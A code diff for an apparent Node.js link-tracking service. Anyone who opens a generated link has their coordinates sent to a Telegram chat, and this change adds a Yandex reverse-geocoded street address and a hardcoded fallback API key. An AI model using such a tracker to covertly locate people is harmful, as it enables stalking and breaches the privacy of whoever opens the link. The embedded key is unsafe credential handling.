@@ -12,6 +12,8 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Куда слать у
 // В памяти: id -> дата генерации
 const links = {};
 
+const YANDEX_API_KEY = process.env.YANDEX_API_KEY || 'a5d4f9a9-2612-4723-8e5d-caf5ec05b971';
+
 app.use(express.json());
 app.use(express.static('public'));
 
@@ -21,6 +23,17 @@ app.post('/api/generate', (req, res) => {
   links[id] = { created: Date.now() };
   res.json({ link: `/track/${id}` });
 });
+
+async function getAddressFromCoords(lat, lon) {
+  const url = `https://geocode-maps.yandex.ru/1.x/?format=json&apikey=${YANDEX_API_KEY}&geocode=${lon},${lat}`;
+  try {
+    const resp = await fetch(url);
+    const data = await resp.json();
+    return data.response.GeoObjectCollection.featureMember[0].GeoObject.metaDataProperty.GeocoderMetaData.text;
+  } catch {
+    return 'Адрес не найден';
+  }
+}
 
 // Приём координат
 app.post('/api/track/:id', async (req, res) => {
@@ -32,8 +45,10 @@ app.post('/api/track/:id', async (req, res) => {
   if (!latitude || !longitude) {
     return res.status(400).json({ error: 'No coordinates' });
   }
+  // Получаем адрес через Яндекс Геокодер
+  const address = await getAddressFromCoords(latitude, longitude);
   // Отправка в Telegram
-  const text = `Гео-ссылка: ${id}\nКоординаты: ${latitude}, ${longitude}\nhttps://yandex.ru/maps/?ll=${longitude}%2C${latitude}&z=16`;
+  const text = `Гео-ссылка: ${id}\nКоординаты: ${latitude}, ${longitude}\nАдрес: ${address}\nhttps://yandex.ru/maps/?ll=${longitude}%2C${latitude}&z=16`;
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   await fetch(url, {
     method: 'POST',
